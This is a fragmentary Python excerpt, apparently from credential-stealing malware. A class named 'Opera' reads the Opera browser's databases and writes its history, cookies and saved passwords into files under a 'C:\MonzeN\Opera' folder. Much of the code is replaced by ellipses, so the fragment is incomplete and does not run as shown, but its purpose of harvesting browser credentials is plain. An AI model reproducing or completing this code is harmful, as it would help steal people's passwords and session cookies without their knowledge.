...
class Opera():
    ...
    def opera():
        try:
            ...
            cursor = c.cursor()
            temp = []
            with open(rf"C:\MonzeN\Opera\history-opera.txt", "a", encoding="utf-8") as history:
                ...
                results += '''
        {
            ...
            with open(rf"C:\MonzeN\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
        ...
        try:
            ...
            for r in cursor.fetchall():
                ...
                with open(r'C:\MonzeN\Opera\opera-passwords.txt', "a") as o:
                    o.write(alldatapass)
            try:
